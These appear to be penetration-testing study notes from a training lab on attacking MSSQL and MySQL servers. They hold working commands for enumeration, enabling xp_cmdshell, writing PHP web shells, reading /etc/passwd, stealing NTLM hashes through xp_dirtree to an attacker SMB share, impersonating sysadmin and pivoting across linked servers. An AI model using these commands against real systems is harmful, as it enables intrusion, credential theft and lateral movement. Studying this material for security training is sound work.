

        Enumeration

By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port. We can use Nmap's default scripts -sC option to enumerate database services on a target system:


$ nmap -Pn -sV -sC -p1433 10.10.10.125


The Nmap scan reveals essential information about the target, like the version and hostname, which we can use to identify common misconfigurations, specific attacks, or known vulnerabilities. Let's explore some common misconfigurations and protocol specifics attacks.



--Authentication Mechanisms

MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:

Authentication Type 	                            Description
Windows authentication mode 	            This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.


Mixed mode 	            Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.


MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can choose an authentication mode for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.



    //Misconfigurations


--Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

    Read or change the contents of a database

    Read or change the server configuration

    Execute commands

    Read local files

    Communicate with other databases

    Capture the local system hash

    Impersonate existing users

    Gain access to other networks


        //  Protocol Specific Attacks


--Read/Change the Database


--MySQL - Connecting to the SQL Server

$ mysql -u julio -pPassword123 -h 10.129.20.13

C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance. 


If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd:


//MSSQL from Linux

$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

$ mssqlclient.py -p 1433 julio@10.129.203.7 

Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look



When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:


$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h




//SQL Default Databases

Note: We will get an error if we try to list or connect to a database we don't have permissions to.



--MySQL


    mysql - is the system database that contains tables that store information required by the MySQL server
   
    information_schema - provides access to database metadata
    
    performance_schema - is a feature for monitoring MySQL Server execution at a low level
    
    sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema


--MSSQL


     master - keeps the information for an instance of SQL Server.
     
     msdb - used by SQL Server Agent.
     
     model - a template database copied for each new database.
     
     resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
    
     tempdb - keeps temporary objects for SQL queries



//SQL Syntax

--Show databases

-MYSQL

mysql> SHOW DATABASES;


-sqlcmd   ( we will need to use GO after our query to execute the SQL syntax. )
 
 SELECT name FROM master.dbo.sysdatabases
 GO


--Select a Database

-MYSQL

mysql> USE htbusers;


-SQLCMD

1> USE htbusers
2> GO


--Show Tables


-MYSQL

mysql> SHOW TABLES;


-SQLCMD

1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO


---Select all Data from Table "users"

-MYSQL

mysql> SELECT * FROM users;


-SQLCMD

1> SELECT * FROM users
2> GO




////Execute Commands


MSSQL has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. Keep in mind the following about xp_cmdshell:

    xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing sp_configure
    
    The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
   
   xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed



1> xp_cmdshell 'whoami'
2> GO


If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO


There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry. 




//Write Local Files


MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.


mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';


n MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT â€¦ INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.

secure_file_priv may be set as follows:

    If empty, the variable has no effect, which is not a secure setting.
    
    If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
    
    If set to NULL, the server disables import and export operations.



--MySQL - Secure File Privileges


mysql> show variables like "secure_file_priv";



---MsSSQL File Write

To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:


1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO


1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO




///Read Local Files


--MSSQL

By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO


--MYSQL

As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

mysql> select LOAD_FILE("/etc/passwd");




///Capture MSSQL Service Hash


In the Attacking SMB section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.



To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:


--XP_DIRTREE Hash Stealing

1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO


--XP_SUBDIRS Hash Stealing

1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO



--XP_SUBDIRS Hash Stealing with impacket

$ sudo impacket-smbserver share ./ -smb2support



///Impersonate Existing Users with MSSQL

SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.


First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate


1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO



--Verifying our Current User and Role

1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go


. To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.

1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO



Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.


We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.

Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.





    ///Communicate with Other Databases with MSSQL


MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.


If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.


---Identify linked Servers in MSSQL

1> SELECT srvname, isremote FROM sysservers
2> GO


IN output 1 means is a remote server, and 0 is a linked server. We can see sysservers Transact-SQL for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).


1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

